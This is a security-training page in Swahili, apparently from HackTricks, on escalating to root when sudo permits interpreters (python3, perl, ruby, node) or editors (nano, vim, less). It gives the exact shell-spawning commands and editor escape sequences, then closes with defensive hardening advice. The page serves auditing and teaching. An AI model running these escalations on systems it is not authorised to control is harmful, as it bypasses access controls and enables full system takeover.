# Abuse ya Amri za Sudo

{{#include ../../banners/hacktricks-training.md}}

## Interpreters zinazoruhusiwa na Sudo

Ikiwa `sudo -l` inamruhusu mtumiaji kuendesha interpreter kama root, ichukulie kama code execution ya moja kwa moja. Interpreters zimeundwa kutekeleza code ya kiholela, kwa hivyo rule inayoruhusu `python3`, `perl`, `ruby`, `lua`, `node`, au binaries zinazofanana kwa kawaida ni sawa na root command execution, isipokuwa arguments zimewekewa mipaka na kuthibitishwa kwa ukali.

Mtiririko wa kawaida wa ukaguzi:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Mifano mingine ya interpreter:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Njia kamili ni muhimu. Ikiwa sheria ya sudo inaruhusu `/usr/bin/python3`, tumia njia hiyo hiyo wakati wa uthibitishaji:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editors zinazoruhusiwa na Sudo

Ikiwa `sudo -l` inamruhusu mtumiaji kuendesha editor ya interactive kama root, ichukulie kama sehemu ya kutekeleza amri, si ruhusa salama ya kuhariri faili. Editors mara nyingi zinaweza kutekeleza shell commands, kusoma faili zozote, kuandika faili zozote, au kuita external helpers kutoka ndani ya editor.

Mtiririko wa kawaida wa ukaguzi:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Utekelezaji wa amri kupitia Nano

Wakati `nano` inaruhusiwa kupitia sudo, utekelezaji wa amri unaweza kufikiwa kutoka kwenye kiolesura cha mhariri:
```text
Ctrl+R
Ctrl+X
```
Kisha toa amri kama vile:
```bash
id
/bin/sh
```
Kwenye terminali zingine, interactive shell inaweza kuhitaji standard streams zielekezwe upya:
```bash
reset; /bin/sh 1>&0 2>&0
```
Mfuatano kamili wa vitufe unaweza kutofautiana kulingana na toleo la nano na chaguo za ujenzi, lakini suala la usalama ni lilelile: editor inaendeshwa kama root na inaweza kuendesha amri za nje.

### Njia nyingine za kawaida za kutoka kwenye editor

Editors za mtindo wa Vim kwa kawaida huwezesha utekelezaji wa amri kupitia `:!`:
```text
:!/bin/sh
```
Programu za kuonyesha kurasa kama `less` pia zinaweza kufichua uendeshaji wa shell:
```text
!/bin/sh
```
## Maelezo ya kiulinzi

- Epuka kutoa interpreters au wahariri shirikishi kupitia sudo.
- Pendelea wrappers zisizobadilika, zinazomilikiwa na root, zinazotekeleza hatua moja maalum ya kiutawala.
- Ikiwa interpreter haiwezi kuepukwa, zuia script path halisi na uzuie user-controlled arguments, writable imports, `PYTHONPATH`, pamoja na unsafe environment preservation.
- Ikiwa file editing inahitajika, zuia file path halisi na uzingatie `sudoedit` ukitumia matoleo ya sudo yaliyopigwa patch pamoja na strict environment handling.
- Kagua `SETENV`, `env_keep`, writable working directories, writable module/import paths, `NOEXEC`, `use_pty`, na logging, lakini usizichukulie kama sandbox kamili.

{{#include ../../banners/hacktricks-training.md}}
